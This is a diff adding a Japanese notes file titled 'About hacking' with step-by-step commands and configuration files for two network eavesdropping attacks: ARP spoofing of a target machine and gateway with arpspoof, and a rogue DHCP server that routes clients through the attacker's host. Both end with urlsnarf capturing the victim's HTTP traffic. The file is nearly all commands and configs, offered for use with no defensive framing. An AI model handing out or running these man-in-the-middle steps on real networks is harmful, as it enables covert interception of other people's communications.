@@ -1,0 +1,154 @@
+ハッキングについて
+============================
+
+arp snooping
+----------------------------
+
+dsniff というハック一覧セットをインストールする
+
+    $ sudo aptitude install -y dsniff
+
+arpspoof の基本的な使い方:
+arpspoof -i インターフェイス -t ターゲットマシン ゲートウェイ
+
+攻撃対象の通信内容がハッキングPCにも届く。
+
+    $ sudo arpspoof -i eth0 -t 192.168.0.5 192.168.0.1
+    $ sudo arpspoof -i eth0 -t 192.168.0.1 192.168.0.5
+
+フォワーディング・リダイレクトの設定も行う。
+
+    $ sudo sysctl -w net.ipv4.ip_forward=1
+    $ sudo sysctl -w net.ipv4.conf.eth0.send_redirects=0
+
+あとはurlsnafを起動しておけば、攻撃対象マシのHTTP通信が出力される。
+
+    $ sudo urlsnarf -i eth0
+
+dhcp snooping
+----------------------------
+
+debian にて操作を行う
+既存のネットワーク: 192.168.1.0/24
+盗聴用のネットワーク: 192.168.1.128/25
+NIC: eth0 
+
+1. NICの設定
+
+eth0を既存用のネットワーク, 盗聴用のネットワーク用に2つ用意する。
+全てスタティックIPアドレスで振り分ける。
+
+    $ sudo emacs /etc/network/interfaces
+    
+    auto eth0
+    iface eth0 inet static
+    
+      # 固定IP アドレス
+      address 192.168.1.129
+      
+      # 192.168.1.128/25 のネットワーク設定
+      netmask 255.255.255.128
+      broadcast 192.168.1.255
+      gateway 192.168.1.129
+      dns-nameservers 192.168.1.129
+              
+     auto eth0:1
+     iface eth0:1 inet static
+     
+       # 固定IPアドレス
+       address 192.168.1.10
+       
+       # 192.168.1.1/24 のネットワーク設定
+       netmask 255.255.255.0
+       broadcast 192.168.1.255
+       gateway 192.168.1.1
+       dns-nameservers 192.168.1.1
+
+次にDNSサーバーを用意し、192.168.1.128/25のネットワークのみにIPアドレスを振り分ける。
+下記はdhcpdを利用した場合。
+
+    $ sudo emacs /etc/dhcpd.conf
+    
+    ddns-update-style interim;
+    ignore client-updates;
+    
+    shared-network Lan {
+      default-lease-time 21600;
+      max-lease-time 43200;
+      authorative;
+    
+      subnet 192.168.1.128 netmask 255.255.255.128 {
+        option routers 192.168.1.129;
+        option subnet-mask 255.255.255.128;
+        option domain-name-servers 192.168.1.129;
+        option time-offset 32400;
+        option broadcast-address 192.168.1.255;
+        range dynamic-bootp 192.168.1.130 192.168.1.254;
+      }    
+    }
+
+udhcpdを利用した場合は下記のようになる。
+
+
+    $ sudo emacs /etc/udhcpd.conf
+    
+    interface       eth0    
+    max_leases      253
+    opt     dns     192.168.1.129
+    option  subnet 255.255.255.128
+    opt     router 192.168.1.129
+    opt     broadcast 192.168.1.255
+    start   192.168.1.130
+    end     192.168.1.254
+    option  lease   864000
+ 
+dhcp\サーバーを起動させる。
+
+    $ sudo /etc/init.d/udhcpd start
+  
+以下の2点疎通確認を行う
+
+・盗聴サーバーとWAN
+・盗聴サーバーとクライアントPC
+
+まだこの時点ではクライアントPCからWANには接続できない。
+クライアントPCからWNAに接続するためには、
+iptablesの設定とipフォワードを設定を行わなければならない。
+
+まず、IP転送の有効化を行う。
+
+    $ sudo emacs /etc/sysctl.conf
+    net.ipv4.ip_forward=1
+
+    $ sudo sysctl -q
+
+設定が有効になっているか確認。
+
+    $ sudo sysctl net.ipv4.ip_forward
+    net.ipv4.ip_forward = 1
+
+次に192.168.1.128/25のネットワークがWAN側に転送されるようiptablesのマスカレード設定を行う。
+
+    $ sudo aptitude install iptables-persistent
+    $ sudo emacs /etc/iptables/rules
+    -A POSTROUTING -s 192.168.1.128/25 -o eth0 -j MASQUERADE 
+
+設定を読込, 正しくインポート出来たか確認する
+
+    $ sudo iptables-restore < /etc/iptables/rules
+    $ sudo iptables -t nat -L
+    Chain PREROUTING (policy ACCEPT)
+    target     prot opt source               destination         
+    
+    Chain POSTROUTING (policy ACCEPT)
+    target     prot opt source               destination         
+    MASQUERADE  all  --  192.168.1.0/25       anywhere            
+    
+    Chain OUTPUT (policy ACCEPT)
+    target     prot opt source               destination  
+
+設定が全て完了したら、
+クライアントPCのネットワークを再起動しWANに接続できるか確認する。
+もし正しく接続できていれば、urlsnarfを使ってhttpパケットの盗聴が行える。
+
+    $ sudo urlsnarf -v -i eth0
